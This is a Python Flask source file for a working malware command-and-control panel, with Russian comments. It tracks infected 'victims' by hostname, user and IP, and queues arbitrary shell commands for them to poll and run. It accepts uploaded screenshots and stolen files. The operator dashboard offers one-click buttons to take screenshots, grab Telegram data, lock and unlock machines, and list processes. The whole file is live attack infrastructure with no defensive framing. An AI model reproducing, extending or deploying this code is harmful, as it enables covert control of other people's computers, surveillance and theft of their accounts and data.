# language: Python 3.11+, file: panel.py
import os, sqlite3, time, secrets, uuid
from flask import Flask, request, g, Response, redirect, render_template_string, send_from_directory, jsonify

API_TOKEN  = os.environ.get("PANEL_TOKEN", "change-me")
ADMIN_USER = os.environ.get("PANEL_USER", "admin")
ADMIN_PASS = os.environ.get("PANEL_PASS", "change-me")
DB_PATH    = os.environ.get("PANEL_DB", "/tmp/panel.db")
UPLOAD_DIR = "/tmp/uploads"
ONLINE_SEC = 90

os.makedirs(UPLOAD_DIR, exist_ok=True)
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024 # Ограничение 10 МБ на файл!

def db():
    if "_db" not in g:
        g._db = sqlite3.connect(DB_PATH, timeout=20)
        g._db.row_factory = sqlite3.Row
        try:
            g._db.execute("PRAGMA journal_mode=WAL;")
            g._db.execute("PRAGMA busy_timeout=10000;")
        except:
            pass
    return g._db

@app.teardown_appcontext
def close_db(e):
    d = g.pop("_db", None)
    if d: d.close()

def init_db():
    with sqlite3.connect(DB_PATH) as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os_info TEXT, ip TEXT,
            first_seen INTEGER, last_seen INTEGER);
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, cmd TEXT,
            issued INTEGER, result TEXT, finished INTEGER DEFAULT 0);
        CREATE INDEX IF NOT EXISTS idx_cmd_victim ON commands(victim_id, finished);
        """)

init_db()

def auth_ok():
    return secrets.compare_digest(request.headers.get("X-Auth", ""), API_TOKEN)

def admin_ok():
    u = request.authorization
    return (u and secrets.compare_digest(u.username, ADMIN_USER)
            and secrets.compare_digest(u.password, ADMIN_PASS))

@app.get("/api/alive")
def alive():
    return "ok", 200

@app.post("/api/register")
def register():
    if not auth_ok(): return ("", 401)
    d = request.get_json(silent=True) or {}
    if not d.get("id"): return ("", 400)
    now = int(time.time())
    with db() as c:
        c.execute("""INSERT INTO victims (id,hostname,username,os_info,ip,first_seen,last_seen)
                     VALUES (?,?,?,?,?,?,?)
                     ON CONFLICT(id) DO UPDATE SET
                       last_seen=excluded.last_seen, hostname=excluded.hostname,
                       username=excluded.username, os_info=excluded.os_info, ip=excluded.ip""",
                  (d["id"], d.get("hostname",""), d.get("username",""), d.get("os",""),
                   request.remote_addr or "", now, now))
    return {"ok": True}

@app.get("/api/poll")
def poll():
    if not auth_ok(): return ("", 401)
    vid = request.args.get("id")
    if not vid: return ("", 400)
    
    now = int(time.time())
    with db() as c:
        c.execute("UPDATE victims SET last_seen=? WHERE id=?", (now, vid))
        c.execute("UPDATE commands SET result='[timeout]', finished=1 WHERE victim_id=? AND finished=0 AND issued < ?",
                  (vid, now - 600))
        row = c.execute("SELECT id,cmd FROM commands WHERE victim_id=? AND finished=0 ORDER BY id LIMIT 1",
                        (vid,)).fetchone()
    
    # Защита от кеширования прокси Layero
    resp = jsonify({"id": row["id"], "cmd": row["cmd"]} if row else {"id": 0, "cmd": None})
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    return resp

@app.post("/api/result")
def result():
    if not auth_ok(): return ("", 401)
    d = request.get_json(silent=True) or {}
    if not d.get("id"): return ("", 400)
    with db() as c:
        c.execute("UPDATE commands SET result=?, finished=1 WHERE id=?",
                  (d.get("result", ""), d["id"]))
    return {"ok": True}

@app.post("/api/upload")
def upload():
    if not auth_ok(): return ("", 401)
    if 'file' not in request.files: return {"error": "no file"}, 400
    f = request.files['file']
    if f.filename == '': return {"error": "no filename"}, 400
    
    filename = f"{uuid.uuid4().hex}_{os.path.basename(f.filename)}"
    filepath = os.path.join(UPLOAD_DIR, filename)
    
    with open(filepath, "wb") as out:
        while True:
            chunk = f.stream.read(65536)
            if not chunk:
                break
            out.write(chunk)
            
    return {"url": f"/files/{filename}"}

@app.get("/files/<filename>")
def files(filename):
    if not admin_ok():
        return Response("auth", 401, {"WWW-Authenticate": 'Basic realm="p"'})
    return send_from_directory(UPLOAD_DIR, filename)

LIST_TPL = """<!doctype html><meta charset=utf-8><title>panel</title>
<style>body{font:14px monospace;background:#111;color:#ddd;padding:1rem}a{color:#7cf}
tr.on td{color:#7f7}tr.off td{color:#777}table{border-collapse:collapse;width:100%}
td,th{padding:.4rem;border-bottom:1px solid #333;text-align:left}</style>
<h2>victims</h2><table><tr><th>id</th><th>host</th><th>user</th><th>ip</th><th>last</th></tr>
{% for v in vs %}<tr class="{{ 'on' if v.online else 'off' }}">
<td><a href="/v/{{ v.id }}">{{ v.id[:40] }}</a></td><td>{{ v.hostname }}</td>
<td>{{ v.username }}</td><td>{{ v.ip }}</td><td>{{ v.ago }}</td></tr>{% endfor %}</table>"""

DETAIL_TPL = """<!doctype html><meta charset=utf-8><title>{{ v.hostname }}</title>
<style>body{font:14px monospace;background:#111;color:#ddd;padding:1rem}a{color:#7cf}
pre{background:#000;padding:.6rem;white-space:pre-wrap;border:1px solid #333}
input[type=text]{width:60%;background:#000;color:#eee;border:1px solid #555;padding:.3rem}
button{background:#252;color:#fff;border:0;padding:.35rem .8rem;cursor:pointer;border-radius:4px}
button:hover{background:#363}
.btn-red{background:#611}
.btn-green{background:#161}
.btn-bar{display:flex; flex-wrap:wrap; gap:0.5rem; margin:1rem 0}
</style>
<p><a href="/">← back</a></p><h2>{{ v.hostname }} / {{ v.username }}</h2>
<p>id: {{ v.id }}<br>ip: {{ v.ip }}<br>os: {{ v.os_info }}<br>last: {{ v.ago }}</p>

<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}">
<input type=text name=cmd placeholder="cmd /c whoami" required><button>send</button></form>

<div class="btn-bar">
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/ping"><button>Ping</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/screenshot"><button>📸 Screenshot</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/grab"><button>📦 Grab TG</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/lock"><button class="btn-red">🔒 Lock</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/unlock"><button class="btn-green">🔓 Unlock</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/ps"><button>Processes</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/ip"><button>IPConfig</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/whoami"><button>Whoami</button></form>
<form method=post action="/send"><input type=hidden name=id value="{{ v.id }}"><input type=hidden name=cmd value="/uninstall"><button class="btn-red">Uninstall</button></form>
</div>

<h3>commands</h3>{% for c in cs %}<pre>[{{ c.id }}] {{ c.cmd }}
{% if not c.finished %}[pending]
{% else %}{% if c.result.startswith('[+] Screenshot: ') %}
<img src="{{ c.result.replace('[+] Screenshot: ', '') }}" style="max-width:100%; border:1px solid #333;">
{% else %}{{ c.result }}{% endif %}{% endif %}</pre>{% endfor %}
<meta http-equiv=refresh content=3>"""

def ago(ts):
    d = int(time.time()) - ts
    if d < ONLINE_SEC: return f"{d}s"
    if d < 3600:       return f"{d//60}m"
    if d < 86400:      return f"{d//3600}h"
    return f"{d//86400}d"

@app.get("/")
def dashboard():
    if not admin_ok():
        return Response("auth", 401, {"WWW-Authenticate": 'Basic realm="p"'})
    rows = db().execute("SELECT * FROM victims ORDER BY last_seen DESC").fetchall()
    vs = [dict(r, online=(int(time.time()) - r["last_seen"]) < ONLINE_SEC,
               ago=ago(r["last_seen"])) for r in rows]
    return render_template_string(LIST_TPL, vs=vs)

@app.get("/v/<vid>")
def victim(vid):
    if not admin_ok():
        return Response("auth", 401, {"WWW-Authenticate": 'Basic realm="p"'})
    v = db().execute("SELECT * FROM victims WHERE id=?", (vid,)).fetchone()
    if not v:
        return ("no victim", 404)
    cs = db().execute("SELECT * FROM commands WHERE victim_id=? ORDER BY id DESC LIMIT 200",
                      (vid,)).fetchall()
    return render_template_string(DETAIL_TPL, v=dict(v, ago=ago(v["last_seen"])),
                                  cs=[dict(c) for c in cs])

@app.post("/send")
def send():
    if not admin_ok():
        return Response("auth", 401, {"WWW-Authenticate": 'Basic realm="p"'})
    vid = request.form.get("id", "")
    cmd = request.form.get("cmd", "").strip()
    if vid and cmd:
        with db() as c:
            c.execute("INSERT INTO commands (victim_id,cmd,issued,finished) VALUES (?,?,?,0)",
                      (vid, cmd, int(time.time())))
    return redirect(f"/v/{vid}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
